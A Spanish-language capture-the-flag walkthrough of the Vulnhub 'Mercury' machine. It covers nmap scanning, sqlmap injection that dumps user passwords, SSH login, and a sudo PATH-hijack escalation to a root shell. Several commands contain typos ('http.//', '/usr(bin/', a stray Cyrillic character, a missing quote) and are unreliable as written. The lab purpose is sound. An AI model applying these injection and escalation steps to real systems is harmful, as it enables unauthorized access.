# Informe vm Mercury-Vulnhub
A continuación, el walkthrough de la máquina virtual Mercury, del grupo Planets de Vulnhub, explicado paso a paso.
## Fase de reconocimiento 

Primero de todo, escaneamos la red local en busca de direcciones IP. Para ello usaremos el comando arp-scan sobre la interfaz de red en la que estemos trabajando: <br><br>
```
arp-scan -I eth3 --localnet --ignoredups
```
![Captura de pantalla 2024-01-23 180113](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/7410790a-b735-47ee-a640-2f05364c6852)

<br>
En mi caso, la IP de la máquina víctima es la 10.0.2.5. Le enviaremos un paquete para comprobar que está activa: <br><br>

```
ping -c1 10.0.2.5
```
<br>
Si se ha recibido el paquete podemos confirmar que nuestra máquina está activa.<br><br>

![Captura de pantalla 2024-01-23 180235](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/d0ec0854-270f-4e5f-af51-eca55140a64f)

A continuación, realizaremos un escaneo de puertos, buscando cuales estan abiertos con nmap <br><br>
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.5 -oG allports
```
![Captura de pantalla 2024-01-23 183345](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/e4719d30-0384-4c9b-bff6-e6f762df49e6)
<br>

Como podemos comprobar, tiene abiertos los puertos 22 y 8080, que corresponden a ssh y http-proxy respectivamente. <br>
## Conexion e investigación de la máquina
Lo siguiente que haremos será conectarnos a la IP a través del puerto 8080 en un navegador. <br><br>

![Captura de pantalla 2024-01-23 183834](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/2415de39-a745-471f-89f9-276249a71a6f)
<br><br>

Vemos que nos aparece un mensaje, así que seguiremos investigando esta web. <br><br>

Lo siguiente que deberíamos hacer sería lanzar un Gobuster en busca de directorios en el servidor de la web. Pero antes de ello, iremos directamente a ver el robots.txt, a ver si ahí encontramos algo y nos podemos ahorrar el Gobuster. <br><br>

![Captura de pantalla 2024-01-23 185208](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/ad4a1645-07c3-460c-92e1-3267378ba98e)
<br><br>

Probaremos de usar el asterisco como directorio: <br><br>

![Captura de pantalla 2024-01-24 092445](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/b00d3310-a9cd-4f74-9aab-786979fe1ec2)
<br><br>

De lo que vemos en la web, lo más interesante son los 3 puntos que aparecen. Y si nos fijamos en el punto 3, tiene pinta de ser un directorio. Probaremos a ver. <br><br>
![Captura de pantalla 2024-01-24 093452](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/5390e909-9cb6-4d86-bc4e-cdaba241cc26)
<br><br>
Y llegamos a lo que aprece ser una web en desarrollo con 2 enlaces. El primero te lleva a datos sobre Mercurio, que puedes ir cambiando si cambias el número de la URL. Hay hasta 8 datos. El segundo enlace es una lista de cosas que hacer para la web. <br>
El siguiente paso será usar una herramienta llamada SQLmap, para que liste bbdd.<br><br>
```
sqlmap -u http.//10.0.2.5:8080/mercuryfacts/ --dbs --batch
```
![Imagen2](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/78754d50-e547-4a22-a04c-b489aba5320e)
<br><br>

El comando nos buscará posibles vulnerabilidades sql en el servidor de la web y también nos listará las bases de datos disponibles en dicho servidor. <br><br>
![Imagen3](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/078871b4-79f8-408e-ad58-2c5eb3a9236f)
<br><br>

Estas son las bases de datos encontradas en el servidor: information_schema y mercury. <br>
Una vez encontradas las bases de datos, explotaremos la que nos interesa, en nuestro caso, la mercury. A continuación, seguiremos usando sqlmap pero esta vez para extraer información de la base de datos mercury: <br><br>
```
sqlmap -u http.//10.0.2.5:8080/mercuryfacts/ -D mercury --dump-all --batch
```
![Imagen4](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/a2bc1efa-acff-4bfa-b168-e24555a23e5b)
<br><br>

Y hemos obtenido una lista de usuarios con sus respectivas contraseñas. Sabiendo que el puerto 22, correspondiente a ssh, está abierto, vamos a intentar explotar esta vulnerabilidad. Tras empezar a probar con cada usuario y contraseña, hemos tenido éxito con el usuario webmaster. <br><br>
```
ssh webmaster@10.0.2.5
```

![Imagen5](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/9c681734-201f-43dc-9d72-ecabcfb608dd)
<br><br>

Como vemos, tenemos acceso con el usuario webmaster. <br><br>

![Imagen6](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/d0979e8d-b046-444a-be3f-3c99fbb649f4)
<br><br>

A continuación, como hemos accedido como webmaster, listaremos los archivos y directorios en busca de algo interesante: <br><br>

![Imagen7](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/fcc207a5-4251-46bc-af88-830e929f3952)
<br><br>

Y hemos encontrado una flag. A continuación, seguiremos indagando en esta máquina en busca de más cosas. <br><br>
Veamos los derechos y privilegios del usuario con el que hemos accedido. <br><br>

![Imagen8](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/f328f7c3-e689-4e3b-b638-74004a3d080c)
<br><br>

Al parecer, el usuario con el que hemos accedido no tiene privilegios de root. Después de comprobar esto, veamos el directorio que aparecía además de la flag que hemos encontrado: <br><br>

![Imagen9](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/9a38498e-ec54-4b02-bb44-492a12568a0b)
<br><br>

Veamos qué contiene el archivo notes.txt. <br><br>

![Imagen10](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/6c6e1cb2-4c8c-4a3e-bec8-6b1e1d268379)
<br><br>
Parece que son 2 cadenas de caracteres codificados, seguramente en base 64. Vamos a intentar traducirlos. <br><br> 
```
echo "bWVyY3VyewlzdGhlc2l6ZW9MC4wNTZFYXJ0aHMK" | base64 -d mercuryisthesizeof0.056Earths
```

![Imagen11](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/64bc5d5e-3a73-46fb-bedf-c8d108845b54)
<br><br>

Tras decodificarla podemos comprobar que era la contraseña para el usuario webmaster. Lo que nos indica que probablemente la otra sea la contraseña del linuxmaster. Decodifiquémosla entonces: <br><br>
```
echo "bWVyYзVyew1lYW5kaWFtZXRlcmlzNDg4MGttCg= base64 -d mercurymeandiameteris4880km
```

![Imagen12](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/9d2d07cd-649c-4f1a-8b16-b11cdb578b49)
<br><br>

Efectivamente, obtenemos la contraseña de linuxmaster. A continuación, entraremos con estas credenciales. <br><br>
```
ssh linuxmaster@10.0.2.5
```
![Imagen13](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/640c4874-100a-4e88-9bc9-ea340c384aec)
<br><br>

Comprobamos qué derechos y privilegios tiene este usuario: <br><br>

![Imagen14](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/178edaf7-e645-4ee0-8c14-fa0be345860a)
<br><br>

Parece ser que tiene privilegios de root sobre /usr/bin/check_syslog.sh. Realizaremos a continuación una escalada de privilegios para obtener acceso como root. <br><br>
```
cat /usr/bin/check_syslog.sh
```
```
tail -n 10 /var/log/syslog
```
```
ln -s /usr/bin/vi tail
```
```
export PATH=$(pwd):$PATH
```
```
sudo --preserve-env=PATH /usr(bin/check_syslog.sh
```

![Imagen15](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/d097a58d-c8f4-47a4-b94b-2d34d11f1741)
<br><br>

A continuación escribiríamos lo siguiente: <br>
```
:!/bin/bash
```
<br>
Y ya tendríamos acceso como root y podríamos encontrar la segunda y útlima flag de esta máquina: <br><br>

![Imagen16](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/0dafd5bd-445a-4c56-924d-c3eb5eb658cd) 
<br>

![Imagen17](https://github.com/eltapia1/Mercury-Vulnhub/assets/150331416/14a1c3d7-f12a-402c-aeb7-b37a99bcc444)







